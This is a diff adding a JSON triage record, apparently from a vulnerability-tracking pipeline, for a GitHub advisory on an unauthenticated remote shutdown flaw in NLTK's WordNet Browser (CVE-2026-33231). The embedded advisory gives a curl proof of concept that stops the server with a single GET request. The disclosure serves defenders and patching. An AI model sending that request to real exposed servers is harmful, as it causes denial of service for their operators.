@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/86466393?v=4\", \"events_url\": \"https://api.github.com/users/leduckhuong/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/leduckhuong/followers\", \"following_url\": \"https://api.github.com/users/leduckhuong/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/leduckhuong/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/leduckhuong\", \"id\": 86466393, \"login\": \"leduckhuong\", \"node_id\": \"MDQ6VXNlcjg2NDY2Mzkz\", \"organizations_url\": \"https://api.github.com/users/leduckhuong/orgs\", \"received_events_url\": \"https://api.github.com/users/leduckhuong/received_events\", \"repos_url\": \"https://api.github.com/users/leduckhuong/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/leduckhuong/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/leduckhuong/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/leduckhuong\", \"user_view_type\": \"public\"}}, {\"type\": \"analyst\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/231019148?v=4\", \"events_url\": \"https://api.github.com/users/v-kondratenko/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/v-kondratenko/followers\", \"following_url\": \"https://api.github.com/users/v-kondratenko/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/v-kondratenko/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/v-kondratenko\", \"id\": 231019148, \"login\": \"v-kondratenko\", \"node_id\": \"U_kgDODcUSjA\", \"organizations_url\": \"https://api.github.com/users/v-kondratenko/orgs\", \"received_events_url\": \"https://api.github.com/users/v-kondratenko/received_events\", \"repos_url\": \"https://api.github.com/users/v-kondratenko/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/v-kondratenko/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/v-kondratenko/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/v-kondratenko\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-33231\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-306\", \"name\": \"Missing Authentication for Critical Function\"}], \"description\": \"### Summary\\n`nltk.app.wordnet_app` allows unauthenticated remote shutdown of the local WordNet Browser HTTP server when it is started in its default mode. A simple `GET /SHUTDOWN%20THE%20SERVER` request causes the process to terminate immediately via `os._exit(0)`, resulting in a denial of service.\\n\\n### Details\\nThe vulnerable logic is in `nltk/app/wordnet_app.py`:\\n\\n- [`nltk/app/wordnet_app.py:242`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L242)\\n  - The server listens on all interfaces:\\n  - `server = HTTPServer((\\\"\\\", port), MyServerHandler)`\\n\\n- [`nltk/app/wordnet_app.py:87`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L87)\\n  - Incoming requests are checked for the exact path:\\n  - `if unquote_plus(sp) == \\\"SHUTDOWN THE SERVER\\\":`\\n\\n- [`nltk/app/wordnet_app.py:88`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L88)\\n  - The shutdown protection only depends on `server_mode`\\n\\n- [`nltk/app/wordnet_app.py:93`](/mnt/Data/my_brains/test/nltk/nltk/app/wordnet_app.py#L93)\\n  - In the default mode (`runBrowser=True`, therefore `server_mode=False`), the handler terminates the process directly:\\n  - `os._exit(0)`\\n\\nThis means any party that can reach the listening port can stop the service with a single unauthenticated GET request when the browser is started in its normal mode.\\n\\n### PoC\\n1. Start the WordNet Browser in Docker in its default mode:\\n\\n```bash\\ndocker run -d --name nltk-wordnet-web-default-retest -p 8004:8004 \\\\\\n  nltk-sandbox \\\\\\n  python -c \\\"import nltk; nltk.download('wordnet', quiet=True); from nltk.app.wordnet_app import wnb; wnb(8004, True)\\\"\\n```\\n\\n2. Confirm the service is reachable:\\n\\n```bash\\ncurl -s -o /tmp/wn_before.html -w '%{http_code}\\\\n' 'http://127.0.0.1:8004/'\\n```\\n\\nObserved result:\\n\\n```text\\n200\\n```\\n\\n3. Trigger shutdown:\\n\\n```bash\\ncurl -s -o /tmp/wn_shutdown.html -w '%{http_code}\\\\n' 'http://127.0.0.1:8004/SHUTDOWN%20THE%20SERVER'\\n```\\n\\nObserved result:\\n\\n```text\\n000\\n```\\n\\n4. Verify the service is no longer available:\\n\\n```bash\\ncurl -s -o /tmp/wn_after.html -w '%{http_code}\\\\n' 'http://127.0.0.1:8004/'\\ndocker ps -a --filter name=nltk-wordnet-web-default-retest --format '{{.Names}}\\\\t{{.Status}}'\\ndocker logs nltk-wordnet-web-default-retest\\n```\\n\\nObserved results:\\n\\n```text\\n000\\nnltk-wordnet-web-default-retest    Exited (0)\\nServer shutting down!\\n```\\n\\n### Impact\\nThis is an unauthenticated denial-of-service issue in the NLTK WordNet Browser HTTP server.\\n\\nAny reachable client can terminate the service remotely when the application is started in its default mode. The impact is limited to service availability, but it is still security-relevant because:\\n\\n- the route is accessible over HTTP\\n- no authentication or CSRF-style confirmation is required\\n- the server listens on all interfaces by default\\n- the process exits immediately instead of performing a controlled shutdown\\n\\nThis primarily affects users who run `nltk.app.wordnet_app` and expose or otherwise allow access to its listening port.\", \"epss\": {\"percentage\": 0.00875, \"percentile\": 0.54731}, \"ghsa_id\": \"GHSA-jm6w-m3j8-898g\", \"github_reviewed_at\": \"2026-03-19T12:42:20Z\", \"html_url\": \"https://github.com/advisories/GHSA-jm6w-m3j8-898g\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-jm6w-m3j8-898g\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-33231\"}], \"nvd_published_at\": \"2026-03-20T23:16:46Z\", \"published_at\": \"2026-03-19T12:42:20Z\", \"references\": [\"https://github.com/nltk/nltk/security/advisories/GHSA-jm6w-m3j8-898g\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-33231\", \"https://github.com/nltk/nltk/commit/bbaae83db86a0f49e00f5b0db44a7254c268de9b\", \"https://github.com/advisories/GHSA-jm6w-m3j8-898g\"], \"repository_advisory_url\": \"https://api.github.com/repos/nltk/nltk/security-advisories/GHSA-jm6w-m3j8-898g\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/nltk/nltk\", \"summary\": \"Unauthenticated remote shutdown in nltk.app.wordnet_app\", \"type\": \"reviewed\", \"updated_at\": \"2026-04-25T01:23:11Z\", \"url\": \"https://api.github.com/advisories/GHSA-jm6w-m3j8-898g\", \"vulnerabilities\": [{\"first_patched_version\": \"3.9.4\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"nltk\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.9.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-jm6w-m3j8-898g",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "nltk: <= 3.9.3"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-33231"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "nltk"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.527711Z",
+  "provenance": {
+    "content_sha256": "301a102e3837c64967f673edd8a7f55b2312756de338d3694cd6c61a50c3dccd",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-03-19T12:42:20Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-jm6w-m3j8-898g",
+  "status": "active",
+  "title": "Unauthenticated remote shutdown in nltk.app.wordnet_app",
+  "updated_at": "2026-04-25T01:23:11Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-jm6w-m3j8-898g"
+}
